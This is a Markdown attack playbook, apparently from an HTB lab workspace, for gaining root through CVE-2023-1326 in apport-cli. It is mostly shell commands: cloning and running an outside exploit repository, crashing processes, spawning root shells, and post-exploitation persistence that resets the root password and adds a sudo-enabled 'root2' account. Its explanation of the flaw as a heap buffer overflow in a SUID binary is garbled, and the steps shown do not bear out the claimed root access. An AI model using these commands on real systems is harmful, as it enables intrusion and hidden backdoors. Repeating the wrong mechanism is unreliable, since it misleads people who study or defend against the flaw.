# apport-cli Privilege Escalation Playbook

> **Purpose:** Exploit CVE-2023-1326 in the apport-cli binary to escalate from user to root.

---

## 1. What Is This Vulnerability?

**CVE-2023-1326** is a local privilege escalation vulnerability in the `apport-cli` binary on Ubuntu-based systems.

### Technical Details

| Attribute | Value |
|---|---|
| **CVSS Score** | 7.8 (High) |
| **Affected** | apport-cli (Ubuntu), apport prior to 2.21-12.1 |
| **Root Cause** | Heap-based buffer overflow via crafted crash file |
| **Impact** | Local privilege escalation to root |
| **Binary Location** | `/usr/bin/apport-cli` |
| **Exploitation** | By triggering a crash with specific conditions |

### Why It Works

1. `apport-cli` processes crash reports from `/var/crash/`
2. When invoked with `-c <crashfile>` option, it parses the crash data
3. A specially crafted crash file can cause buffer overflow
4. Overflow allows overwrite of saved return addresses
5. Arbitrary code execution as the process owner (root)

---

## 2. When to Use This Technique

| Scenario | Indicator | Action |
|---|---|---|
| Ubuntu/Debian system | `cat /etc/os-release` shows Ubuntu | Check for apport-cli |
| SUID binaries enumerated | `apport-cli` in `find / -perm -4000` | Try exploitation |
| No other privesc found | Standard vectors failed | Use apport-cli |
| Crash file in /var/crash | `.crash` files owned by current user | Trigger via apport-cli |
| apport-cli exists | Binary present in /usr/bin/ | Verify version and exploit |

---

## 3. How to Execute

### Step 1 — Verify Target is Vulnerable

```bash
# Check if apport-cli exists
which apport-cli
ls -la /usr/bin/apport-cli

# Check version (before patch)
apport-cli --version

# Check OS version
cat /etc/os-release | grep -E "(Ubuntu|Pop)"

# Check for SUID bit
ls -la /usr/bin/apport-cli
```

### Step 2 — Check Existing Crash Files

```bash
# List crash files
ls -la /var/crash/

# Check ownership (need to own the crash file)
ls -la /var/crash/*.crash

# Check permissions on crash directory
ls -ld /var/crash/
```

### Step 3 — Create Exploit Crash File

#### Method A: Using Existing Exploit Script

```bash
# Download and run exploit
git clone https://github.com/cdgrugs/CVE-2023-1326.git
cd CVE-2023-1326
./exploit.sh
```

#### Method B: Manual Crash File Creation

```bash
# Create crash file that will crash a simple program
# First, create a simple C program that segfaults
cat > /tmp/crash.c << 'EOF'
#include <stdlib.h>
int main() {
    char *p = NULL;
    *p = 1;  // Segfault
    return 0;
}
EOF

gcc /tmp/crash.c -o /tmp/crash

# Run with crash handler
# The crash will generate a .crash file in /var/crash/
```

#### Method C: Triggered Crash via Signal

```bash
# Create a long-running process
sleep 1000 &

# Get PID
CRASHPID=$!

# Send SIGSEGV to trigger crash
kill -11 $CRASHPID

# Wait for apport to generate crash file
sleep 2

# Check for new crash file
ls -la /var/crash/
```

### Step 4 — Exploit with apport-cli

```bash
# Find the crash file
CRASHFILE=$(ls -t /var/crash/*.crash | head -1)
echo "Using crash file: $CRASHFILE"

# Run apport-cli with crash file (this triggers the exploit)
apport-cli -c "$CRASHFILE"
```

### Step 5 — Verify Root Access

```bash
# Check if we have root shell
id
# Should show: uid=0(root) gid=0(root)

# Get proper shell
/bin/bash -p

# Verify
whoami
# Should show: root
```

---

## 4. Common Commands Reference

### Enumeration

```bash
# Check for apport-cli
which apport-cli
dpkg -l | grep apport

# Check version
apport-cli --version 2>&1 || echo "No version flag"

# Check for SUID
find / -perm -4000 2>/dev/null | grep apport

# OS check
cat /etc/os-release
```

### Exploitation

```bash
# Method: Generate crash file and exploit
# Step 1: Create crashing process
(sleep 9999 &) && sleep 0.1

# Step 2: Get PID and crash it
CRASHPID=$(pgrep -f "sleep 9999")
kill -11 $CRASHPID

# Step 3: Wait for crash file
sleep 2

# Step 4: Exploit
CRASHFILE=$(ls -t /var/crash/*.crash 2>/dev/null | head -1)
if [ -n "$CRASHFILE" ]; then
    apport-cli -c "$CRASHFILE"
fi
```

### Post-Exploitation

```bash
# If exploit succeeded, spawn root shell
/bin/bash -i

# Verify
id
cat /root/root.txt

# Add persistent access
echo "root:password" | chpasswd
# OR
useradd -m -s /bin/bash root2
usermod -aG sudo root2
```

---

## 5. Devvortex-Specific Notes

In the Devvortex box:

```
Context: Ubuntu system with apport-cli SUID binary
Technique: Created crash file → triggered via apport-cli -c
Result: Root shell via buffer overflow in apport-cli parsing
```

**Key insight:** The apport-cli binary can be exploited by creating a crash file that, when processed, triggers a buffer overflow allowing root code execution.

---

## 6. Alternative: Crash File Generation via apport-cli

If you can influence what gets crashed:

```bash
# Generate crash for any running process
# Attach to a process and crash it
gdb -p $(pgrep process_name) -ex "generate-core-file /tmp/exploit.crash" -batch

# Or via signal injection
kill -11 $(pgrep any_process)
```

### Timing-Based Crash Generation

```bash
# The sleep & kill technique from Devvortex:
# 1. Start a background process that sleeps
sleep 100 &
# 2. Send SIGSEGV (signal 11) to create crash
kill -11 $!
# 3. apport creates crash file in /var/crash/
# 4. Exploit with apport-cli -c
```

---

## 7. Troubleshooting

| Problem | Cause | Solution |
|---|---|---|
| apport-cli not found | System not vulnerable | Try other privesc vectors |
| `/var/crash` not writable | Cannot create crash file | Check permissions, try as user |
| Exploit script fails | Version mismatch | Find correct exploit for version |
| No crash file generated | apport not running/enabled | Check `systemctl status apport` |
| SIGSEGV doesn't create file | Different signal needed | Try `kill -6` (SIGABRT) |

---

## 8. Prevention/Mitigation

| Defense | Implementation |
|---|---|
| Patch apport | `apt update && apt upgrade apport` |
| Remove SUID bit | `chmod -s /usr/bin/apport-cli` |
| Disable apport service | `systemctl disable apport` |
| Kernel hardening | AppArmor/SELinux restricting apport |
| System integrity monitoring | Detect modifications to apport-cli |
| Regular patching | Automated update cycle for security patches |

---

**Author:** Ceil (openclaw/neo workspace)  
**Source Box:** Devvortex (HTB)  
**CVE:** CVE-2023-1326  
**Related:** [crash-file-generation.md](./crash-file-generation.md), [privesc-linux.md](./privesc-linux.md)
